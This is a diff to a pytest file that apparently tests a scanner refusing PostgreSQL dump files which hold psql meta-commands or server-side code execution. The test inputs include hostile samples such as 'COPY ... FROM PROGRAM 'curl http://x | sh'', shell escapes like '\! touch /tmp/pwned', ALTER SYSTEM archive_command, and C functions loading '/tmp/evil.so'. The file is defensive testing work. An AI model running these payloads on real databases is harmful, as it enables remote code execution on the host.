@@ -36,7 +36,6 @@ INSERT INTO public.t VALUES (5, E'it\\'s fine \\\\');
 -- \\! line comment
 SELECT "weird
 \\name";
-\\connect odoo
 \\unrestrict abc123
 """
 
@@ -71,7 +70,7 @@ def test_non_utf8_bytes_pass(tmp_path):
         (b"\\connect db `id`\n", 1, "connect"),
         (b"\\connect db \\! id\n", 1, "connect"),
         (b"\\.\n", 1, "."),
-        (b"SET standard_conforming_strings = off;\nSELECT '\\'; \\! id; --';\n", 1, "standard_conforming_strings"),
+        (b"SET standard_conforming_strings = off;\nSELECT '\\'; \\! id; --';\n", 1, "SET"),
         # a COPY line that is not at a statement boundary does not open a COPY block
         (b"SELECT 1\nCOPY t FROM stdin;\n\\! id\n\\.\n", 3, "!"),
     ],
@@ -145,9 +144,68 @@ def test_copy_in_any_other_form_is_rejected(tmp_path, copy_stmt):
     body = copy_stmt + b"it's data\n\\.\n\\! touch /tmp/pwned\nSELECT 'close';\n"
     result = find_psql_meta_command(_write(tmp_path, body))
     assert result is not None
-    assert result[1] == "copy"
+    assert result[1] == "COPY"
 
 
 def test_copy_inside_function_body_passes(tmp_path):
     body = b"CREATE FUNCTION f() RETURNS void LANGUAGE sql AS $$\nCOPY t\nFROM '/x';\n$$;\n"
     assert find_psql_meta_command(_write(tmp_path, body)) is None
+
+
+def test_connect_is_rejected(tmp_path):
+    """Only pg_dump -C / pg_dumpall write it; it would steer the restore into another database."""
+    assert find_psql_meta_command(_write(tmp_path, b"SELECT 1;\n\\connect other_db\n")) == (2, "connect")
+
+
+@pytest.mark.parametrize(
+    ("body", "word"),
+    [
+        (b"COPY public.t FROM PROGRAM 'curl http://x | sh';\n", "COPY"),
+        (
+            b"CREATE FUNCTION f() RETURNS void AS $$\nBEGIN\n  COPY t FROM\n  PROGRAM 'id';\nEND\n$$;\n",
+            "COPY PROGRAM",
+        ),
+        (
+            b"CREATE FUNCTION f() RETURNS void AS $$ begin copy t to program $c$id$c$; end $$ LANGUAGE plpgsql;\n",
+            "COPY PROGRAM",
+        ),
+        (b"SELECT 1 FROM PROGRAM 'x';\n", "COPY PROGRAM"),
+        (b"DO $$ BEGIN PERFORM 1; END $$;\n", "DO"),
+        (b"SELECT 1;\n  do\n$x$ begin end $x$;\n", "DO"),
+        (b"ALTER SYSTEM SET archive_command = 'id';\n", "ALTER SYSTEM"),
+        (b"ALTER /* x */\nSYSTEM SET x = 1;\n", "ALTER SYSTEM"),
+        (b"CREATE FUNCTION f() RETURNS int AS '/tmp/evil.so', 'f' LANGUAGE C STRICT;\n", "LANGUAGE"),
+        (b"CREATE FUNCTION f() RETURNS int LANGUAGE 'c' AS '/tmp/evil.so';\n", "LANGUAGE"),
+        (b"CREATE FUNCTION f() RETURNS void AS $$import os$$ LANGUAGE\n  plpython3u;\n", "LANGUAGE"),
+    ],
+)
+def test_server_side_code_execution_is_rejected(tmp_path, body, word):
+    result = find_psql_meta_command(_write(tmp_path, body))
+    assert result is not None
+    assert result[1] == word
+
+
+def test_ordinary_sql_that_only_looks_similar_passes(tmp_path):
+    body = (
+        b"CREATE TABLE public.res_lang (id integer, language character varying, code text);\n"
+        b"CREATE TABLE public.program (id integer, done boolean);\n"
+        b"CREATE VIEW public.v AS SELECT p.id FROM public.program p;\n"
+        b"CREATE VIEW public.w AS SELECT id FROM program;\n"
+        b"CREATE FUNCTION public.f() RETURNS integer LANGUAGE sql AS $$ SELECT count(*)::int FROM program $$;\n"
+        b"CREATE FUNCTION public.g() RETURNS trigger LANGUAGE plpgsql AS $_$\nBEGIN\n  RETURN NEW;\nEND\n$_$;\n"
+        b"COMMENT ON TABLE public.program IS 'do not ALTER SYSTEM; LANGUAGE C; FROM PROGRAM x';\n"
+        b"ALTER TABLE public.program ADD CONSTRAINT domain_ok CHECK (done IS NOT NULL);\n"
+        b"CREATE DOMAIN public.d AS integer;\n"
+        b"COPY public.program (id, done) FROM stdin;\n1\tDO $$ FROM PROGRAM 'x' LANGUAGE c\n\\.\n"
+    )
+    assert find_psql_meta_command(_write(tmp_path, body)) is None
+
+
+def test_refusal_message_says_what_was_found(tmp_path, monkeypatch):
+    monkeypatch.setattr(db_mod.subprocess, "run", lambda *a, **k: pytest.fail("psql must not start"))
+    dump = _write(tmp_path, b"SELECT 1;\nDO $$ BEGIN PERFORM 1; END $$;\n")
+    ok, errors = db_mod.restore_database_report("db", dump)
+    assert ok is False
+    assert "a DO block" in errors[0]
+    assert "line 2" in errors[0]
+    assert "psql command" not in errors[0]
